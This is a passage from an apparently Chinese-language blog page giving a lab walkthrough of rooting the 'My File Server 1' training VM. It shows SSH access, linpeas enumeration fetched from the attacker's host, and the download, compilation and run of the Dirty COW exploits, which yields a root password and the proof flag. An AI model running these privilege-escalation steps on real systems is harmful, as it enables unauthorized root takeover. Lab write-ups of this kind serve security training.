class="line">直接 </span><br><span class="line">ssh -i test smbuser@192.168.49.143</span><br><span class="line"> ssh -i test smbuser@192.168.49.143</span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      Armour Infosec                                        #</span><br><span class="line">   #                         --------- www.armourinfosec.com ------------                       #</span><br><span class="line">   #                                    My File Server - 1                                      #</span><br><span class="line">   #                               Designed By  :- Akanksha Sachin Verma                        #</span><br><span class="line">   #                               Twitter      :- @akankshavermasv                             #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Last login: Thu Feb 20 16:42:21 2020</span><br><span class="line">[smbuser@fileserver ~]$ id</span><br><span class="line">uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)</span><br><span class="line">[smbuser@fileserver ~]$ ip a</span><br><span class="line"></span><br><span class="line">find / -user root -perm -4000 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">sudo -s</span><br><span class="line"></span><br><span class="line">sudo -l</span><br><span class="line">需要密码不行啊</span><br><span class="line">uname -a</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /proc/version</span><br><span class="line">[smbuser@fileserver ~]$ uname -a</span><br><span class="line">Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[smbuser@fileserver ~]$ cat /etc/issue</span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      Armour Infosec                                        #</span><br><span class="line">   #                         --------- www.armourinfosec.com ------------                       #</span><br><span class="line">   #                                    My File Server - 1                                      #</span><br><span class="line">   #                             Designed By :- Akanksha Sachin Verma                           #</span><br><span class="line">   #                              Twitter    :- @akankshavermasv                                #</span><br><span class="line">   ##############################################################################################</span><br><span class="line">                                       IP:\4</span><br><span class="line">                                       Hostname: \n</span><br><span class="line"></span><br><span class="line">\S</span><br><span class="line">Kernel \r on an \m</span><br><span class="line">[smbuser@fileserver ~]$ cat /proc/version</span><br><span class="line">Linux version 3.10.0-229.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Fri Mar 6 11:36:42 UTC 2015</span><br><span class="line">都获取不了内核信息</span><br><span class="line">linux 3.10 又太多了怎末搞</span><br><span class="line">用一个辅助工具</span><br><span class="line"></span><br><span class="line">本地</span><br><span class="line">php -S 0:80</span><br><span class="line">wget http://192.168.49.129/linpeas.sh </span><br><span class="line"></span><br><span class="line">[smbuser@fileserver ~]$ chmod +x linpeas.sh</span><br><span class="line">[smbuser@fileserver ~]$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">看到这个suggester</span><br><span class="line">下面40611 /40847 两个最有可能 试一下</span><br><span class="line"></span><br><span class="line">╔══════════╣ Executing Linux Exploit Suggester</span><br><span class="line">╚ https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,[ RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125; ],ubuntu=16.04|14.04|12.04</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,[ RHEL=5|6|7 ],ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000367] Sudoer-to-root</span><br><span class="line"></span><br><span class="line">   Details: https://www.sudo.ws/alerts/linux_tty.html</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ RHEL=7 ]&#123;sudo:1.8.6p7&#125;</span><br><span class="line">   Download URL: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c</span><br><span class="line">   Comments: Needs to be sudoer. Works only on SELinux enabled systems</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40611</span><br><span class="line">searchsploit -m 40847</span><br><span class="line">cat 40611 </span><br><span class="line"> 有一个这个 gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">编译加一个 -pthread  就行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver ~]$ cd /tmp</span><br><span class="line">[smbuser@fileserver tmp]$ wget http://192.168.49.129/40611.c</span><br><span class="line">--2024-08-01 14:54:53--  http://192.168.49.129/40611.c</span><br><span class="line">Connecting to 192.168.49.129:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2821 (2.8K) [text/x-c]</span><br><span class="line">Saving to: ‘40611.c’</span><br><span class="line"></span><br><span class="line">100%[=========================================================&gt;] 2,821       --.-K/s   in 0s      </span><br><span class="line"></span><br><span class="line">2024-08-01 14:54:53 (977 MB/s) - ‘40611.c’ saved [2821/2821]</span><br><span class="line"></span><br><span class="line">[smbuser@fileserver tmp]$ gcc -pthread 40611.c -o 40</span><br><span class="line">[smbuser@fileserver tmp]$ ls</span><br><span class="line">40  40611.c  systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">[smbuser@fileserver tmp]$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwt.  8 root    root     4096 Aug  1 14:55 .</span><br><span class="line">dr-xr-xr-x. 18 root    root     4096 Feb 18  2020 ..</span><br><span class="line">-rwxrwxr-x   1 smbuser smbuser 13437 Aug  1 14:55 40</span><br><span class="line">-rw-rw-r--   1 smbuser smbuser  2821 Aug  1 14:54 40611.c</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .font-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .ICE-unix</span><br><span class="line">drwx------   3 root    root       16 Aug  1 13:18 systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .Test-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .X11-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .XIM-unix</span><br><span class="line">[smbuser@fileserver tmp]$ ./40</span><br><span class="line">usage: dirtyc0w target_file new_content</span><br><span class="line">[smbuser@fileserver tmp]$ .40 /etc/passwd</span><br><span class="line">-bash: .40: command not found</span><br><span class="line">[smbuser@fileserver tmp]$ ./40 /etc/passwd</span><br><span class="line">运行要一个目标，给了也读取不了，用下一个</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"> cat 40847.cpp</span><br><span class="line">// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">看到这个</span><br><span class="line"> wget http://192.168.49.129/40847.cpp</span><br><span class="line"> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">chmod +x dcow</span><br><span class="line">./docw</span><br><span class="line">cd root</span><br><span class="line">cat proof.txt即可</span><br><span class="line"></span><br><span class="line">[smbuser@fileserver tmp]$ wget http://192.168.49.129/40847.cpp</span><br><span class="line">--2024-08-01 15:01:32--  http://192.168.49.129/40847.cpp</span><br><span class="line">Connecting to 192.168.49.129:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10212 (10.0K) [text/x-c]</span><br><span class="line">Saving to: ‘40847.cpp’</span><br><span class="line"></span><br><span class="line">100%[=========================================================&gt;] 10,212      --.-K/s   in 0s      </span><br><span class="line"></span><br><span class="line">2024-08-01 15:01:32 (495 MB/s) - ‘40847.cpp’ saved [10212/10212]</span><br><span class="line"></span><br><span class="line">[smbuser@fileserver tmp]$ ls</span><br><span class="line">40  40611.c  40847.cpp  systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">[smbuser@fileserver tmp]$ ls -liah</span><br><span class="line">total 40K</span><br><span class="line">100663425 drwxrwxrwt.  8 root    root    4.0K Aug  1 15:01 .</span><br><span class="line">      128 dr-xr-xr-x. 18 root    root    4.0K Feb 18  2020 ..</span><br><span class="line">101525978 -rwxrwxr-x   1 smbuser smbuser  14K Aug  1 14:55 40</span><br><span class="line">101525972 -rw-rw-r--   1 smbuser smbuser 2.8K Aug  1 14:54 40611.c</span><br><span class="line">101525973 -rw-rw-r--   1 smbuser smbuser  10K Aug  1 15:01 40847.cpp</span><br><span class="line">100974275 drwxrwxrwt.  2 root    root       6 Feb 18  2020 .font-unix</span><br><span class="line"> 34310886 drwxrwxrwt.  2 root    root       6 Feb 18  2020 .ICE-unix</span><br><span class="line">    11133 drwx------   3 root    root      16 Aug  1 13:18 systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">   191607 drwxrwxrwt.  2 root    root       6 Feb 18  2020 .Test-unix</span><br><span class="line">   191606 drwxrwxrwt.  2 root    root       6 Feb 18  2020 .X11-unix</span><br><span class="line"> 67574086 drwxrwxrwt.  2 root    root       6 Feb 18  2020 .XIM-unix</span><br><span class="line">[smbuser@fileserver tmp]$ chod +x 40847.cpp</span><br><span class="line">-bash: chod: command not found</span><br><span class="line">[smbuser@fileserver tmp]$ chmod +x 40847.cpp</span><br><span class="line">[smbuser@fileserver tmp]$  g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">[smbuser@fileserver tmp]$ ls</span><br><span class="line">40       40847.cpp  systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">40611.c  dcow</span><br><span class="line">[smbuser@fileserver tmp]$ ls -al</span><br><span class="line">total 88</span><br><span class="line">drwxrwxrwt.  8 root    root     4096 Aug  1 15:04 .</span><br><span class="line">dr-xr-xr-x. 18 root    root     4096 Feb 18  2020 ..</span><br><span class="line">-rwxrwxr-x   1 smbuser smbuser 13437 Aug  1 14:55 40</span><br><span class="line">-rw-rw-r--   1 smbuser smbuser  2821 Aug  1 14:54 40611.c</span><br><span class="line">-rwxrwxr-x   1 smbuser smbuser 10212 Aug  1 15:01 40847.cpp</span><br><span class="line">-rwxrwxr-x   1 smbuser smbuser 46976 Aug  1 15:03 dcow</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .font-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .ICE-unix</span><br><span class="line">drwx------   3 root    root       16 Aug  1 13:18 systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .Test-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .X11-unix</span><br><span class="line">drwxrwxrwt.  2 root    root        6 Feb 18  2020 .XIM-unix</span><br><span class="line">[smbuser@fileserver tmp]$ ./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br><span class="line">[smbuser@fileserver tmp]$ client_loop: send disconnect: Broken pipe</span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh -i test smbuser@192.168.49.143</span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      Armour Infosec                                        #</span><br><span class="line">   #                         --------- www.armourinfosec.com ------------                       #</span><br><span class="line">   #                                    My File Server - 1                                      #</span><br><span class="line">   #                               Designed By  :- Akanksha Sachin Verma                        #</span><br><span class="line">   #                               Twitter      :- @akankshavermasv                             #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Last login: Thu Aug  1 14:29:36 2024 from 192.168.49.129</span><br><span class="line">[smbuser@fileserver ~]$ su</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br><span class="line">[smbuser@fileserver ~]$ cd /tmp</span><br><span class="line">[smbuser@fileserver tmp]$ ls</span><br><span class="line">40       40847.cpp  systemd-private-7589a403315640849d2bd3e903513400-httpd.service-UQrmxo</span><br><span class="line">40611.c  dcow       systemd-private-f83fc758df1345ff9f7315f620208d95-httpd.service-oOvap6</span><br><span class="line">[smbuser@fileserver tmp]$ su</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br><span class="line">[smbuser@fileserver tmp]$ ./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br><span class="line">[smbuser@fileserver tmp]$ su</span><br><span class="line">Password: </span><br><span class="line">[root@fileserver tmp]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@fileserver tmp]# cd /root</span><br><span class="line">[root@fileserver ~]# ls</span><br><span class="line">proof.txt</span><br><span class="line">[root@fileserver ~]# cat p*</span><br><span class="line">Best of Luck</span><br><span class="line">af52e0163b03cbf7c6dd146351594a43</span><br><span class="line">[root@fileserver ~]# ls -liah</span><br><span class="line">total 44K</span><br></pre></td></tr></table></figure>
+
+
+                    </div>
+</div>
+
+    <div class="cube-article-nav">
+        <ul>
+            
+                    
+                        <li class="next">
+                            <a href="/2024/07/31/rtb1BaJi/">
+                                rtb1BaJi
+                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        
+        </ul>
+    </div>
+    
+        
+            <!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+                
+        </div>
+        <div class="cube-right">
+            
+
+<div class="cube-search cube-sidebar" id="cube-search">
+    <div class="search-container">
+        <input type="text" placeholder="Search" class="cube-search-input" id="cube-search-input">
+        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
+    </div>
+    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
+</div>
+<script>
+    (function (window) {
+        'use strict';
+        window.searchModule = {}
+        window.searchModule.JSONUrl = '/content.json'
+        window.searchModule.rootUrl = '/'
+    })(window)
+</script>
+<div class="cube-search-form">
+    <div class="cube-search-control">
+        <input type="text" placeholder="Search" class="search-input">
+        <a class="close-button">
+            <i class="cube-icon cube-close" aria-hidden="true"></i>
+        </a>
+    </div>
+    <div class="cube-search-result"></div>
+</div>
+
+
+<div class="cube-author cube-sidebar" id="cube-author">
+    
+    
+    <span>John Doe</span>
+    
+    
+    <div class="count">
+        <a class="count articles"><span>19</span>Article</a>
+        <a class="count tags"><span>0</span>Tags</a>
+        <a class="count categories"><span>0</span>Categories</a>
+    </div>
+</div>
+
+
+
+<div class="cube-music cube-sidebar" id="cube-music">
+    <div class="cube-player aplayer" id="cube-player"></div>
+</div>
+<script>
+    (function (window) {
+        window.musicModule = {}
+        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"}]}'
+        window.musicModule.lrcConfig = {
+            open: 'Open Lyrics',
+            close: 'Close Lyrics'
+        }
+    })(window)
+</script>
+
+
+
+<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
+    <div class="title">
+        <a>Recent Posts</a>
+    </div>
+    <ul class="list">
+        
+        
+        <li>
+            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
+            
+            <div class="normal">
+                <p class="index first">
+                    <span>1</span>
+                </p>
+                <p class="title">
+                    <a href="/2024/08/01/MyFileServer/" title="MyFileServer">MyFileServer</a>
+                </p>
+            </div>
+            
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>2</span>
+                </p>
+                <p class="title">
+                    <a href="/2024/07/31/rtb1BaJi/" title="rtb1BaJi">rtb1BaJi</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>3</span>
+                </p>
+                <p class="title">
+                    <a href="/2024/07/31/xiaoBaChang/" title="xiaoBaChang">xiaoBaChang</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>4</span>
+                </p>
+                <p class="title">
+                    <a href="/2024/07/30/DC9-Try/" title="DC9-Try">DC9-Try</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>5</span>
+                </p>
+                <p class="title">
+                    <a href="/2024/07/30/DC8-Try/" title="DC8-Try">DC8-Try</a>
+                </p>
+            </div>
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+
+
+
+
+
+<div class="cube-links cube-sidebar" id="cube-links">
+    <div class="title">
+        <a>Links</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            
+            
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/GitHub.png">
+            
+            <a href="https://github.com/ZEROKISEKI" target="_blank">GitHub</a>
+        </li>
+        
+        <li>
+            
+            
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/Coding.png">
+            
+            <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+        </li>
+        
+        <li>
+            
+            
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/SF.png">
+            
+            <a href="https://segmentfault.com/u/aonosora" target="_blank">SF社区</a>
+        </li>
+        
+        <li>
+            
+            
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/开发者头条.png">
+            
+            <a href="https://toutiao.io/u/148070" target="_blank">开发者头条</a>
+        </li>
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
+    <div class="title">
+        <a>Friend Links</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/micblo.png">
+            <a href="https://blog.micblo.com/" target="_blank">罗大佬</a>
+        </li>
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/DIYgod.jpg">
+            <a href="https://www.anotherhome.net/" target="_blank">DIYgod</a>
+        </li>
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="/images/friend_links.jpg ">
+            <a href="https://aonosora.com/" target="_blank">咪西西の部落格</a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+    </div>
+</div>
+<footer class="cube-footer">
+    
+© 2017 John Doe
+
+<br>
+Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+</footer>
+<!-- inject:script -->
+<script src="/js/script.js"></script>
+<!-- endinject -->
+<div class="cube-loading out"></div>
+</body>
+</html>
